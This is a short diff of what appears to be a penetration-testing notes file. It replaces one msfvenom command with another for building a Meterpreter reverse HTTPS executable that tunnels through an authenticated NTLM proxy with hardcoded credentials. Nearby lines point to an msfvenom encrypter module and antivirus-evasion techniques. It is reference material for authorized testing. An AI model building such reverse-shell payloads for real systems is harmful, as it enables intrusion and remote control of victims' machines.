@@ -98,7 +98,7 @@ NOTES:
 ➤ Custom msfvenom encrypter module => https://github.com/Sogeti-Pentest/Encrypter-Metasploit
 ➤ Recent Meterpreter reverse HTTP(S) payloads use the WinInet API and will leverage any proxy or authentication settings the user has configured for internet access.
 ➤ Command to generate a meterpreter payload (with hardcoded proxy infos & creds) that is able to go through an authenticated ntlm Web proxy:
-  + msfvenom -p windows/meterpreter/reverse_https_proxy EXITFUNC=thread HttpProxyHost=X.X.X.X HttpProxyPort=8080 HttpProxyUser="Domain\account" HttpProxyPass=AccountPassword LHOST=Y.Y.Y.Y LPORT=443 -a x86 -e x86/bf_xor -f raw -f exe-only -o reversehttps.exe
+   + msfvenom -p windows/meterpreter_reverse_https HttpProxyHost=XX.XX.XX.XX HttpProxyPort=3128 HttpProxyUser="Domain\account" HttpProxyPass=Password EXITFUNC=thread LHOST=XX.XX.XX.XX LPORT=443 LURI=webtest -f exe -o /tmp/meterpreter-reverse-https.exe
 ➤ Multiple techniques & tools (such as shellcode loaders and packers) exist to evade AV detection. For more details please refer to the 'Defense Evasion' section.
 
 
